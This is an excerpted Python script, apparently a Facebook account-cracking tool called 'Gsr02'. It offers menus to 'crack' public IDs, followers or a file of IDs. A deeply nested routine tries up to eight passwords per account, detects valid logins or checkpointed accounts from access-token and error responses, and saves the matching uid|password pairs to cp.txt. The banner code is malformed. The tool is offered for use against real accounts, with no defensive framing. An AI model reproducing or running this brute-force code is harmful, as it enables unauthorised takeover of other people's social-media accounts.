...
def linex():
	os.system('echo  "\n ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n  ❣═══════════════════════════════════════════════❣\n        print("\033[1;36;40m_________")                           \n       print("\033[1;36;40m   _____/       ____  _____________") \n       print("\033[1;36;40m\_____  \       / ___\/  ___/\_  __ \")\n       print("\033[1;36;40m        \     / /_/  >___ \  |  | \/")\n      print("\033[1;36;40m/_______  / /\  \___  /____  > |__|")   \n              print("\033[1;36;40m\/  \/ /_____/     \/")         \n  ❣═════════════════════════════════════════════════❣                                  \n         ╔═════════════➻❥═══════════════╗\n         ║ TOOL NAME: [ Gsr02 ]         ║\n         ║ AUTHOR   : [SUHAIL-GSR]      ║\n         ║ GITHUB   : [git.io/SH]       ║\n         ╚═════════════➻❥═══════════════╝" | lolcat -a -d 2 -s 50') 
...
def token():
    os.system("clear")
    try:
        token = open("gsr_token.txt", "r").read()
        menu()
...
def menu():
    ...
    logo()
    print("")
    print("\033[1;34;40m   HELLO   : \033[92;1m"+xn)
    print("\033[1;34;40m   REGION  : \033[92;1m") + loc
    print("\033[1;34;40m   YOUR IP : \033[92;1m") + ip
    print("")
...
def crack1():
	...
	print("")
	print("\033[1;33;40m  [1]➤ CRACK PUBLIC ID")
	print("\033[1;33;40m  [2]➤ CRACK FOLLOWERS")
	print("\033[1;33;40m  [3]➤ CRACK FILE")
	print("")
	crack_select1()
...
def crack_select1():
	...
	logo()
	print("")
	print("\033[1;33;40m➤ TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[1;33;40m➤ BRUTE STARTED\x1b[0m")
	print("\033[1;33;40m➤ PLEASE WAIT  \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[91;1m[CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[91;1m[CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[91;1m[CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[91;1m[CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[91;1m[CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[91;1m[CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[91;1m[CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[91;1m[CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
...
def crack():
	...
	print("")
	print("\033[1;37;40m  [1]➣ CRACK PUBLIC ID")
	print("\033[1;37;40m  [2]➣ CRACK FOLLOWERS")
	print("\033[1;37;40m  [3]➣ CRACK FILE")
	print("")
	crack_select()
...
def crack_select():
	...
	logo()
	print("")
	print("\033[1;35;40m★  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[1;35;40m★  BRUTE HAS BEEN STARTED\x1b[0m")
	print("\033[1;35;40m★  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
